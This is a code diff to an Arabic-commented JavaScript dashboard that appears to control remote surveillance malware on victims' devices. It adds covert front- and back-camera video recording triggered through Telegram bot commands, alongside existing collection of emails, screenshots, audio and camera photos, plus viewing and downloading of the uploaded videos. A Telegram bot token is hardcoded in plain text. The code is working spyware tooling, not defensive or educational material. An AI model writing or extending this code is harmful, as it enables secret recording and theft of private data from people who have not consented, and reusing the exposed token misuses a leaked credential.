@@ -40,12 +40,15 @@ let liveEmails = [];
 let liveScreenshots = [];
 let liveAudioRecordings = [];
 let liveCameraPhotos = [];
+let liveVideos = []; // ✅ جديد — تسجيلات الفيديو
 
 let panelOpenTime = Date.now();
 let liveFilterEnabled = true;
 
 // ✅ حالة التسجيل الصوتي
 let isRecordingAudio = false;
+// ✅ حالة تسجيل الفيديو
+let isRecordingVideo = false;
 
 // ✅ ✅ ✅ إعدادات Telegram (مباشرة)
 const TG_BOT_TOKEN = "5826969870:AAF2RAg49eZHLJ62onDtVjBskxgYFvfdkpQ";
@@ -136,6 +139,22 @@ function initSSE() {
                 addLiveAudio(data);
                 showNotification('🎤 تسجيل صوتي جديد', data.file_name || '', '🎤');
                 const badge = document.getElementById('liveAudioCount');
+                if (badge) {
+                    const n = parseInt(badge.textContent) || 0;
+                    badge.textContent = n + 1;
+                }
+            } catch (err) {}
+        });
+
+        // ✅ ✅ ✅ جديد — فيديو
+        sse.addEventListener('new_video', (e) => {
+            try {
+                const data = JSON.parse(e.data);
+                addLiveVideo(data);
+                const camLabel = data.camera_name === 'front' ? 'أمامي' : 'خلفي';
+                const sizeMB = ((data.file_size || 0) / 1024 / 1024).toFixed(1);
+                showNotification('🎥 فيديو جديد', `كاميرا ${camLabel} — ${sizeMB} MB`, '🎥');
+                const badge = document.getElementById('liveVideoCount');
                 if (badge) {
                     const n = parseInt(badge.textContent) || 0;
                     badge.textContent = n + 1;
@@ -347,6 +366,19 @@ function openAdvancedMenu() {
                 </button>
             </div>
 
+            <!-- ✅ ✅ ✅ جديد — فيديو -->
+            <div style="background:#0a1a0a;border:2px solid #00ff66;border-radius:10px;padding:15px;margin-bottom:15px;">
+                <h3 style="color:#00ff66;margin-bottom:10px;font-size:16px;">🎥 تسجيل فيديو</h3>
+                <div style="display:flex;gap:8px;margin-bottom:8px;">
+                    <button id="startVideoFrontBtn" onclick="startVideoRecording('front')" style="flex:1;background:#00aa44;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🤳 فيديو أمامي</button>
+                    <button id="startVideoBackBtn" onclick="startVideoRecording('back')" style="flex:1;background:#007733;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📷 فيديو خلفي</button>
+                </div>
+                <button id="stopVideoBtn" onclick="stopVideoRecording()" style="width:100%;margin-bottom:10px;background:#ff3300;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;opacity:0.5;" disabled>⏹️ إيقاف + إرسال</button>
+                <button onclick="openLiveVideos()" style="width:100%;background:#0a2a0a;color:#00ff66;border:1px solid #00ff66;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                    📁 عرض الفيديوهات (<span id="liveVideoCount">0</span>)
+                </button>
+            </div>
+
             <div style="background:#1a0a1a;border:2px solid #9b59b6;border-radius:10px;padding:15px;margin-bottom:15px;">
                 <h3 style="color:#9b59b6;margin-bottom:10px;font-size:16px;">📸 الكاميرا</h3>
                 <div style="display:flex;gap:8px;margin-bottom:10px;">
@@ -383,6 +415,8 @@ function updateAdvancedCounters() {
     if (c) c.textContent = liveCameraPhotos.length;
     const s = document.getElementById('liveScreenshotsCount');
     if (s) s.textContent = liveScreenshots.length;
+    const v = document.getElementById('liveVideoCount');
+    if (v) v.textContent = liveVideos.length;
 }
 
 // ✅ ✅ ✅ إرسال أمر مباشر لـ Telegram Bot
@@ -430,6 +464,49 @@ async function stopAudioRecording() {
         if (startBtn) { startBtn.disabled = false; startBtn.style.opacity = '1'; }
         if (stopBtn) { stopBtn.disabled = true; stopBtn.style.opacity = '0.5'; }
         showNotification('✅ تم الإيقاف', 'جاري رفع التسجيل عبر البوت...', '✅');
+    } else {
+        alert('❌ فشل إرسال الأمر للبوت');
+    }
+}
+
+// ✅ ✅ ✅ فيديو — بدء (Telegram مباشر)
+async function startVideoRecording(camera) {
+    if (isRecordingVideo) {
+        alert('⚠️ في تسجيل شغال بالفعل — أوقفه الأول');
+        return;
+    }
+    const cmd = camera === 'front' ? '/videofront' : '/videoback';
+    const ok = await sendTelegramCommand(cmd);
+    if (ok) {
+        isRecordingVideo = true;
+        const frontBtn = document.getElementById('startVideoFrontBtn');
+        const backBtn = document.getElementById('startVideoBackBtn');
+        const stopBtn = document.getElementById('stopVideoBtn');
+        if (frontBtn) { frontBtn.disabled = true; frontBtn.style.opacity = '0.5'; }
+        if (backBtn) { backBtn.disabled = true; backBtn.style.opacity = '0.5'; }
+        if (stopBtn) { stopBtn.disabled = false; stopBtn.style.opacity = '1'; }
+        showNotification(
+            `🎥 بدأ تسجيل الفيديو ${camera === 'front' ? 'الأمامي' : 'الخلفي'}`,
+            'اضغط "إيقاف + إرسال" عند الانتهاء',
+            '🎥'
+        );
+    } else {
+        alert('❌ فشل إرسال الأمر للبوت');
+    }
+}
+
+// ✅ ✅ ✅ فيديو — إيقاف (Telegram مباشر)
+async function stopVideoRecording() {
+    const ok = await sendTelegramCommand('/stopvideo');
+    if (ok) {
+        isRecordingVideo = false;
+        const frontBtn = document.getElementById('startVideoFrontBtn');
+        const backBtn = document.getElementById('startVideoBackBtn');
+        const stopBtn = document.getElementById('stopVideoBtn');
+        if (frontBtn) { frontBtn.disabled = false; frontBtn.style.opacity = '1'; }
+        if (backBtn) { backBtn.disabled = false; backBtn.style.opacity = '1'; }
+        if (stopBtn) { stopBtn.disabled = true; stopBtn.style.opacity = '0.5'; }
+        showNotification('✅ تم الإيقاف', 'جاري رفع الفيديو عبر البوت...', '✅');
     } else {
         alert('❌ فشل إرسال الأمر للبوت');
     }
@@ -532,6 +609,93 @@ function deleteLiveAudio(idx) {
     authFetch(`/api.php?action=delete_audio&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
         liveAudioRecordings.splice(idx, 1);
         renderLiveAudio();
+    });
+}
+
+// ═══════════════════════════════════════════
+// ✅ ✅ ✅ جديد — Overlay الفيديو
+// ═══════════════════════════════════════════
+function openLiveVideos() {
+    const ov = document.getElementById('liveVideosOverlay');
+    if (ov) ov.style.display = 'block';
+    loadVideos();
+}
+function closeLiveVideos() {
+    const ov = document.getElementById('liveVideosOverlay');
+    if (ov) ov.style.display = 'none';
+}
+function clearLiveVideos() {
+    if (!confirm('مسح كل الفيديوهات؟')) return;
+    authFetch(`/api.php?action=clear_videos&device=${encodeURIComponent(currentDevice)}`).then(() => {
+        liveVideos = [];
+        renderLiveVideos();
+        updateAdvancedCounters();
+    });
+}
+function addLiveVideo(data) {
+    liveVideos.unshift(data);
+    if (liveVideos.length > 100) liveVideos = liveVideos.slice(0, 100);
+    if (document.getElementById('liveVideosOverlay') && document.getElementById('liveVideosOverlay').style.display === 'block') renderLiveVideos();
+    updateAdvancedCounters();
+}
+async function loadVideos() {
+    if (!currentDevice) return;
+    try {
+        const response = await authFetch(`/api.php?action=get_videos&device=${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        if (Array.isArray(data)) {
+            liveVideos = data;
+            renderLiveVideos();
+            updateAdvancedCounters();
+        }
+    } catch (e) {}
+}
+function renderLiveVideos() {
+    const list = document.getElementById('liveVideosList');
+    if (!list) return;
+    if (liveVideos.length === 0) {
+        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد فيديوهات بعد</p>';
+        return;
+    }
+    list.innerHTML = '';
+    liveVideos.forEach((vid, idx) => {
+        const camLabel = vid.camera_name === 'front' ? '🤳 أمامي' : '📷 خلفي';
+        const camColor = vid.camera_name === 'front' ? '#00cc66' : '#00aa44';
+        const sizeMB = ((vid.file_size || 0) / 1024 / 1024).toFixed(1);
+        const durationSec = Math.round((vid.duration_ms || 0) / 1000);
+        const div = document.createElement('div');
+        div.style.cssText = `background:#0a1a0a;border:2px solid ${camColor};padding:15px;border-radius:12px;`;
+        div.innerHTML = `
+            <div style="color:${camColor};font-size:13px;font-weight:bold;margin-bottom:8px;">🎥 فيديو ${camLabel}</div>
+            <div style="color:#ccc;font-size:12px;margin-bottom:8px;">📅 ${formatDate(vid.timestamp)}</div>
+            <div style="color:#888;font-size:11px;margin-bottom:8px;">${vid.file_name || ''} — ${sizeMB} MB${durationSec > 0 ? ' — ' + durationSec + ' ثانية' : ''}</div>
+            <video controls style="width:100%;max-height:300px;margin-bottom:8px;border-radius:8px;background:#000;" preload="metadata">
+                <source src="data:video/mp4;base64,${vid.file_data}" type="video/mp4">
+            </video>
+            <div style="display:flex;gap:8px;">
+                <button onclick="downloadLiveVideo(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️ تحميل</button>
+                <button onclick="deleteLiveVideo(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️ حذف</button>
+            </div>
+        `;
+        list.appendChild(div);
+    });
+}
+function downloadLiveVideo(idx) {
+    const v = liveVideos[idx];
+    if (!v) return;
+    const a = document.createElement('a');
+    a.href = `data:video/mp4;base64,${v.file_data}`;
+    a.download = v.file_name || 'video.mp4';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+}
+function deleteLiveVideo(idx) {
+    if (!confirm('حذف هذا الفيديو؟')) return;
+    authFetch(`/api.php?action=delete_video&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
+        liveVideos.splice(idx, 1);
+        renderLiveVideos();
+        updateAdvancedCounters();
     });
 }
 
@@ -1231,6 +1395,7 @@ function selectDevice(deviceId) {
         loadAudioRecordings();
         loadScreenshots();
         loadCameraPhotos();
+        loadVideos(); // ✅ جديد — تحميل الفيديوهات عند اختيار الجهاز
     }
 }
 
@@ -1315,10 +1480,17 @@ async function updateLiveData() {
             if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
         }
 
+        // ✅ جديد — عدّاد الفيديو
+        if (data.video_count !== undefined) {
+            const vBadge = document.getElementById('liveVideoCount');
+            if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.video_count);
+        }
+
         const advCounters = {
             liveAudioCount: data.audio_count || 0,
             liveScreenshotsCount: data.screenshot_count || 0,
-            liveCameraCount: data.camera_count || 0
+            liveCameraCount: data.camera_count || 0,
+            liveVideoCount: data.video_count || 0
         };
         Object.keys(advCounters).forEach(id => {
             const el = document.getElementById(id);
@@ -2148,3 +2320,12 @@ loadAuthorizedDevices();
 
 loadDevices();
 setInterval(loadDevices, 30000);
+
+// ✅ جعل الدوال متاحة globally لـ onclick في HTML
+window.openLiveVideos = openLiveVideos;
+window.closeLiveVideos = closeLiveVideos;
+window.clearLiveVideos = clearLiveVideos;
+window.downloadLiveVideo = downloadLiveVideo;
+window.deleteLiveVideo = deleteLiveVideo;
+window.startVideoRecording = startVideoRecording;
+window.stopVideoRecording = stopVideoRecording;
